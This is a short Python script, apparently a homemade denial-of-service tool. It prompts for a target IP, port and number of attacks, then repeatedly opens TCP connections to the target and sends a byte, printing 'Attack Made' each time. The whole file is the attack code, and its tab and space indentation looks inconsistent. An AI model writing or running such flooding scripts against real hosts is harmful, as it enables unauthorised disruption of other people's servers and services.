import socket
i = 0
ip = input('IP >> ')
port = int(input('Port >> '))
noa = int(input("Number Of Attack >> "))

if port == 0:
    port = 80

print("Attack Has Been Started")

while True:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip, port))
   if i < noa:
      s.send(b'\x01')
      print("Attack Made" + "\n")
      i+=1
   if i >= noa:
   	break

